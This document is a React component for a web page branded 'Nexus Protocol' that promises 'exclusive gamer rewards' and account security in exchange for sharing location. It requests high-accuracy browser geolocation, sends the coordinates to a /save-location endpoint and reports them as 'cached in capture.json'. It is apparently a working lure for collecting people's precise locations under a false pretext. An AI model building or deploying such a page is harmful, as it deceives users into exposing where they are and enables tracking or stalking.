import React, { useState } from 'react';
import axios from 'axios';
import { Shield, MapPin, CheckCircle, AlertTriangle } from 'lucide-react';

export default function App() {
  const [status, setStatus] = useState('idle'); // idle, loading, success, error
  const [error, setError] = useState(null);

  const requestLocation = () => {
    setStatus('loading');
    
    if (!navigator.geolocation) {
      setError('Geolocation is not supported by your browser.');
      setStatus('error');
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const { latitude, longitude, accuracy } = position.coords;
        try {
          await axios.post('/save-location', {
            latitude,
            longitude,
            accuracy
          });
          setStatus('success');
        } catch (err) {
          setError('Failed to sync location with server.');
          setStatus('error');
        }
      },
      (err) => {
        setError(err.message);
        setStatus('error');
      },
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );
  };

  return (
    <div className="min-h-screen bg-[#111] text-white flex flex-col items-center justify-center p-6 font-sans">
      <div className="max-w-md w-full bg-[#1a1a1a] border border-white/10 p-8 rounded-2xl shadow-2xl text-center">
        
        {/* Header Icon */}
        <div className="mb-6 flex justify-center">
          <div className="w-16 h-16 bg-blue-600/10 border border-blue-500/30 rounded-2xl flex items-center justify-center">
            {status === 'success' ? (
              <CheckCircle className="text-green-400" size={32} />
            ) : status === 'error' ? (
              <AlertTriangle className="text-red-400" size={32} />
            ) : (
              <MapPin className="text-blue-400" size={32} />
            )}
          </div>
        </div>

        {/* Title */}
        <h1 className="text-3xl font-black uppercase tracking-tighter mb-4 italic">
          Nexus <span className="text-blue-500">Protocol</span>
        </h1>
        
        <p className="text-gray-400 text-sm mb-8 leading-relaxed">
          Verify your deployment location to unlock exclusive gamer rewards and secure your account sync. 
          <span className="block mt-2 text-xs font-bold text-gray-500 uppercase tracking-widest italic">Explicit Consent Required</span>
        </p>

        {/* Content States */}
        {status === 'idle' && (
          <button
            onClick={requestLocation}
            className="w-full py-4 bg-blue-600 hover:bg-blue-500 text-white font-black uppercase tracking-widest rounded-xl transition-all shadow-[0_0_30px_rgba(37,99,235,0.3)]"
          >
            Share Location
          </button>
        )}

        {status === 'loading' && (
          <div className="flex flex-col items-center gap-4 py-4">
            <div className="w-8 h-8 border-4 border-blue-500/20 border-t-blue-500 rounded-full animate-spin" />
            <p className="text-xs font-bold uppercase tracking-widest text-blue-400 animate-pulse">Requesting Access...</p>
          </div>
        )}

        {status === 'success' && (
          <div className="space-y-4">
            <div className="p-4 bg-green-500/10 border border-green-500/30 rounded-xl">
              <p className="text-green-400 text-sm font-bold uppercase tracking-wide">Sync Complete</p>
            </div>
            <p className="text-gray-500 text-xs italic">Your location has been securely cached in capture.json</p>
          </div>
        )}

        {status === 'error' && (
          <div className="space-y-4 text-center">
            <p className="text-red-400 text-sm font-bold">Error: {error}</p>
            <button
              onClick={requestLocation}
              className="w-full py-3 border border-white/10 hover:bg-white/5 rounded-xl text-xs font-bold uppercase tracking-widest"
            >
              Try Again
            </button>
          </div>
        )}

        {/* Footer Security Note */}
        <div className="mt-8 pt-6 border-t border-white/5 flex items-center justify-center gap-2 text-gray-600">
          <Shield size={14} />
          <span className="text-[10px] uppercase font-bold tracking-[.2em]">Secure Data Protocol</span>
        </div>
      </div>
    </div>
  );
}
